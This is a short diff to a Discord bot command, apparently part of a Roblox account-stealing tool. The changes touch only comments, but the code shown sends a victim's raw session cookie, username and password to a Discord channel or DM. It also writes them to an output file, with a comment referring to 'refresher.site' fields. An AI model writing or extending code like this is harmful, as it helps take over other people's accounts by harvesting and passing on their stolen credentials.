@@ -166,7 +166,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         totalGamepasses += gamepassCount;
         if (premium === 'Yes') totalPremium++;
 
-        // DM embed with original cookie (no new_cookie)
+        // DM embed with original cookie
         const embed = buildSuccessEmbed(
           `\`\`\`\n${rawCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
         );
@@ -179,7 +179,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           if (chan && chan.send) await chan.send({ embeds: [embed] });
         }
 
-        // File output
+        // File output (no Data header, only refresher.site fields)
         outputLines.push(`Username: ${username}`);
         outputLines.push(`Password: ${password}`);
         outputLines.push(`UserID: ${userId}`);
